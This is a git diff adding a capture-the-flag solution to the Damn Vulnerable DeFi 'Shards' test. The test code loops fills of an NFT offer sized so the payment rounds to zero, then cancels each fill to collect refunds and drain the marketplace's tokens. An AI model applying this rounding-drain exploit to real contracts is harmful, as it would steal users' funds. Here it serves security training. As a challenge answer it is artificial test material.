@@ -12,6 +12,8 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+import {Attack} from "./Attack.t.sol";
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +116,22 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        Attack attack = new Attack(marketplace, token);
+
+        uint256 amountForZeroTransfer = NFT_OFFER_SHARDS * 1e6 / (NFT_OFFER_PRICE * MARKETPLACE_INITIAL_RATE);
+        uint256 profitPerAttack = amountForZeroTransfer * MARKETPLACE_INITIAL_RATE / 1e6;
+        uint256 maxLoopToDrain = token.balanceOf(address(marketplace)) / profitPerAttack;
+        uint256 maxLoop = 9500 < maxLoopToDrain ? 9500 : maxLoopToDrain;
+
+        for (uint32 i = 0; i < maxLoop; i++) {
+            attack.fill(1, amountForZeroTransfer);
+        }
+
+        vm.warp(block.timestamp + marketplace.TIME_BEFORE_CANCEL());
+
+        for (uint32 i = 0; i < maxLoop; i++) {
+            attack.cancel(1, i, recovery);
+        }
     }
 
     /**
